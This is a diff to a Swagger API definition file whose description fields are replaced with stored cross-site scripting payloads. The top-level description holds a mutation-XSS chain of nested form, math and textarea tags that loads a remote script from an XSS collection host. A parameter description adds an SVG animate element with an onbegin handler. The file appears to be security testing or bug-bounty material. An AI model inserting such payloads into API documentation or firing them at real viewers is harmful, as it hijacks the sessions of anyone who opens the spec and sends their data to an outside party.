@@ -1,10 +1,15 @@
 swagger: '2.0'
 info:
   title: Classic API Resource Documentation
-  description: |  
-    <script>alert('XSS')</script>
+  description: <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script>'"><script src=https://xss.report/c/c4sper0bug></script>">
   version: production
-basePath: /test-c4sper0
+basePath: /JSSResource/
+produces:
+  - application/xml
+  - application/json
+consumes:
+  - application/xml
+  - application/json
 security:
   - basicAuth: []
 paths:
@@ -17,3 +22,24 @@ paths:
         - accounts
       operationId: findAccounts
       summary: Finds all accounts
+  '/accounts/groupid/{id}':
+    delete:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
+    onbegin="alert('XSS')"/>
+</svg>"></form>
+
+          format: int64
+          in: path
+          name: id
+          required: true
+          type: integer
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: deleteGroupById
+      summary: Deletes a group by id
